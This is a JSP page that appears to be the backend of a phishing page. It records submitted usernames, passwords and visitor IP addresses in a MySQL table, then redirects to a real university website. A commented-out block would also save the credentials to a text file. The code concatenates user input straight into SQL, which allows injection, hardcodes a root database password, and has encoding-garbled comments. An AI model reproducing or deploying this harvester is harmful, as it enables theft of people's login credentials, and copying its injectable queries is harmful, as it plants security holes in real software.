<%@ page language="java" contentType="text/html; charset=GB18030"
pageEncoding="GB18030"%>
<%@ page import="java.util.*" %>
<%@ page import="java.io.*" %> 
<%@ page import ="java.sql.*" %>
<%@ page import="com.mysql.jdbc.Driver" %>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<title>�����֤</title>
</head>
<body>
<%
  Statement st;
  Connection conn = null;
  //�������ݿ�������
   Class.forName("com.mysql.jdbc.Driver").newInstance();
   //���ݿ�����URL
   String url="jdbc:mysql://127.0.0.1:3306/jspmysql";
   //String url="jdbc:mysql://localhost:3306/sample_db?user=root&password=your_password";
   //���ݿ��û���������
   String user="root";
   String  password="1234";
   //�������ݿ����ȡ��һ�����ݿ�����ֵ
   conn =  DriverManager.getConnection(url,user,password);
%>
<%
request.setCharacterEncoding("GBK");
String name = request.getParameter("userName");
String password1 = request.getParameter("password");
String ip=(String)request.getRemoteAddr();
/* String path=request.getRealPath("/");
  File fp=new File(path,"��¼.txt");
  FileWriter fwriter=new FileWriter(fp);
  fwriter.write("�û�����");
  fwriter.write(name+"\r\n");
  fwriter.write("���룺");
  fwriter.write(password+"\r\n");
  fwriter.write(ip);
  fwriter.close();*/
  String sql="INSERT INTO jsp(user,password,ip) VALUES('"+name+"','"+password1+"','"+ip+"')";
  st = (Statement) conn.createStatement();    // ��������ִ�о�̬sql����Statement����   
  int count = st.executeUpdate(sql);  // ִ�в��������sql��䣬�����ز������ݵĸ���   
  if(count>0)
    {
    response.sendRedirect("http://www.hitwh.edu.cn");
    }   
  else
  {
	response.sendRedirect("index.html"); 
  }
	conn.close();   //�ر����ݿ�����   
%>

<%

%>
</body>
</html> 
